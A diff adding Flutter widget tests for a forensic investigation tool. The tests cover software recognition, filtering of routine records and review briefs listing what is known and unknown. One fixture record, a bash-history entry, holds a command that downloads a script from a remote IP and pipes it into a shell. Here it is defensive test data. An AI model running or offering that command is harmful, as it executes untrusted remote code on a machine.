@@ -10,6 +10,7 @@ import '../support/harness.dart';
 /// how much historical evidence there is, and what could not be collected.
 void main() {
   group('source selection', _sourceSelection);
+  group('recognition and briefs', _recognitionAndBriefs);
 
   late FakeTransport transport;
 
@@ -495,5 +496,166 @@ void _sourceSelection() {
         .toList();
     expect(collect, isNotEmpty);
     expect('${collect.last.body}', contains('NETWORK'));
+  });
+}
+
+/// Recognition, presentation filtering and review briefs.
+///
+/// The workload question: can an investigator see what the machine accounted
+/// for, skip it, and get a one-page answer about the thing that is left.
+void _recognitionAndBriefs() {
+  late FakeTransport transport;
+  const caseId = 'case-2';
+  const base = '/api/v1/investigations/$caseId';
+
+  final rows = [
+    {
+      'id': 'r1', 'reference': 'EXEC-0001', 'source': 'kernel audit log',
+      'evidence_kind': 'EXECUTION_EVIDENCE', 'execution_confirmed': true,
+      'timestamp': '2026-03-14T09:00:00+00:00', 'triage': 'NEEDS_REVIEW',
+      'investigator_priority': 'PRIORITY_2', 'priority_score': 1,
+      'full_command_line': 'python3 --version', 'executable': '/usr/bin/python3',
+      'process_name': 'python3', 'recognized_name': 'python3-minimal',
+      'command_reconstruction_status': 'EXACT', 'payload': {'raw': 'kept'},
+    },
+    {
+      'id': 'r2', 'reference': 'CMD-0001', 'source': 'bash history',
+      'evidence_kind': 'COMMAND_HISTORY', 'execution_confirmed': false,
+      'timestamp': '2026-03-14T09:05:00+00:00', 'triage': 'POTENTIALLY_HARMFUL',
+      'investigator_priority': 'PRIORITY_1', 'priority_score': 5,
+      'full_command_line': 'curl -fsSL http://198.51.100.9/x.sh | sh',
+      'executable': null, 'process_name': 'curl', 'recognized_name': null,
+      'command_reconstruction_status': 'EXACT', 'payload': {'raw': 'kept'},
+    },
+  ];
+
+  setUp(() {
+    transport = FakeTransport();
+    transport.respondJson('/health', loadFixture('health'));
+    transport.respondJson(base, {
+      'id': caseId, 'title': 'Recognition', 'status': 'completed', 'device': {},
+      'metadata': {}, 'evidence_count': 2, 'finding_count': 0,
+    });
+    for (final path in ['/evidence', '/findings', '/reports', '/timeline', '/artifacts',
+                        '/event-timeline', '/finding-evidence', '/collection-limitations']) {
+      transport.respondJson('$base$path', {'items': const []});
+    }
+    transport.respondJson('$base/execution-events', {'items': rows});
+    transport.respondJson('/api/v1/investigations', {'items': const []});
+  });
+
+  Future<void> pump(WidgetTester tester) async {
+    tester.view.physicalSize = const Size(1500, 1400);
+    tester.view.devicePixelRatio = 1.0;
+    addTearDown(tester.view.reset);
+    await tester.pumpWidget(harness(const DeviceScreen(caseId: caseId), transport: transport));
+    await tester.pumpAndSettle();
+  }
+
+  /// Scoped to the activity list. The screen also carries a raw-JSON section
+  /// holding every record, so an unscoped finder matches the debug dump rather
+  /// than the list an investigator reads.
+  Finder inActivityPanel(Finder matching) => find.descendant(
+        of: find.byKey(const Key('activity-panel')), matching: matching);
+
+  testWidgets('recognized software is named on the record', (tester) async {
+    await pump(tester);
+    expect(find.text('RECOGNIZED: python3-minimal'), findsOneWidget);
+  });
+
+  testWidgets('recognition is never presented as a safety verdict', (tester) async {
+    await pump(tester);
+    final badge = tester.widget<Tooltip>(
+      find.ancestor(of: find.text('RECOGNIZED: python3-minimal'), matching: find.byType(Tooltip)));
+    expect(badge.message, contains('not that it is safe'));
+  });
+
+  testWidgets('recognized software can be searched by the name the package manager uses',
+      (tester) async {
+    await pump(tester);
+    await tester.enterText(
+      find.descendant(of: find.byKey(const Key('activity-panel')),
+                      matching: find.byType(TextField)).first,
+      'python3-minimal');
+    await tester.pumpAndSettle();
+    expect(inActivityPanel(find.textContaining('python3 --version')), findsWidgets);
+    expect(inActivityPanel(find.textContaining('198.51.100.9')), findsNothing,
+        reason: 'the name the package manager uses should find only that record');
+  });
+
+  testWidgets('the accounted-for majority can be filtered away', (tester) async {
+    await pump(tester);
+    // Both records are visible before filtering.
+    expect(inActivityPanel(find.textContaining('python3 --version')), findsWidgets);
+    expect(inActivityPanel(find.textContaining('198.51.100.9')), findsWidgets);
+
+    final presentation = find.byWidgetPredicate(
+      (widget) => widget is DropdownButton<String> && widget.value == 'all'
+          && widget.items!.any((item) => item.value == 'NEEDS_ATTENTION'));
+    expect(presentation, findsOneWidget);
+    await tester.tap(presentation);
+    await tester.pumpAndSettle();
+    expect(find.textContaining('Routine / recognized (1)'), findsWidgets);
+    await tester.tap(find.textContaining('Needs attention (1)').last);
+    await tester.pumpAndSettle();
+
+    expect(inActivityPanel(find.textContaining('198.51.100.9')), findsWidgets);
+    expect(inActivityPanel(find.textContaining('python3 --version')), findsNothing,
+        reason: 'the recognized record should have been filtered out');
+  });
+
+  testWidgets('a review brief is offered on every record', (tester) async {
+    await pump(tester);
+    expect(find.byKey(const Key('brief-EXEC-0001')), findsOneWidget);
+    expect(find.byKey(const Key('brief-CMD-0001')), findsOneWidget);
+  });
+
+  testWidgets('a brief shows what is known, unknown and cited', (tester) async {
+    transport.respondJson('$base/briefs', {
+      'brief_id': 'BRIEF-1',
+      'subject': {'type': 'activity', 'id': 'CMD-0001', 'label': 'curl ... | sh'},
+      'classification': 'Potentially harmful', 'presentation': 'Needs attention',
+      'priority': 'Priority 1 — investigate first',
+      'execution': {'state': 'NOT ESTABLISHED',
+                    'detail': 'Shell history records that it was entered.'},
+      'recognition': {'state': 'UNKNOWN', 'detail': 'Nothing accounts for this.'},
+      'summary': 'Remote content piped into an interpreter.',
+      'why_surfaced': 'Nothing inspects what arrived before it runs.',
+      'sections': [
+        {'title': 'Occurrences', 'body': ['CMD-0001  2026-03-14  bash history'], 'evidence': []},
+      ],
+      'known': ['The command was recorded in full.'],
+      'unknown': ['Whether it ran at all.'],
+      'collection_limitations': ['The kernel audit log was not available.'],
+      'suggested_review': ['Read the full command.'],
+      'evidence_ids': ['CMD-0001'],
+      'disclaimer': 'This brief is not a malware verdict.',
+    });
+    await pump(tester);
+    await tester.tap(find.byKey(const Key('brief-CMD-0001')));
+    await tester.pumpAndSettle();
+
+    expect(find.byKey(const Key('review-brief')), findsOneWidget);
+    expect(find.text('What is known'), findsOneWidget);
+    expect(find.text('What is unknown'), findsOneWidget);
+    expect(find.text('— Whether it ran at all.'), findsOneWidget);
+    expect(find.textContaining('not a malware verdict'), findsOneWidget);
+    expect(find.byKey(const Key('export-brief')), findsOneWidget);
+  });
+
+  testWidgets('a brief states its collection limitations', (tester) async {
+    transport.respondJson('$base/briefs', {
+      'subject': {'type': 'activity', 'id': 'CMD-0001', 'label': 'x'},
+      'execution': {'state': 'NOT ESTABLISHED', 'detail': 'd'},
+      'recognition': {'state': 'UNKNOWN', 'detail': 'd'},
+      'summary': 's', 'why_surfaced': 'w', 'sections': const [],
+      'known': const [], 'unknown': const [],
+      'collection_limitations': ['Process accounting was not enabled.'],
+      'suggested_review': const [], 'evidence_ids': const [], 'disclaimer': 'd',
+    });
+    await pump(tester);
+    await tester.tap(find.byKey(const Key('brief-CMD-0001')));
+    await tester.pumpAndSettle();
+    expect(find.text('— Process accounting was not enabled.'), findsOneWidget);
   });
 }
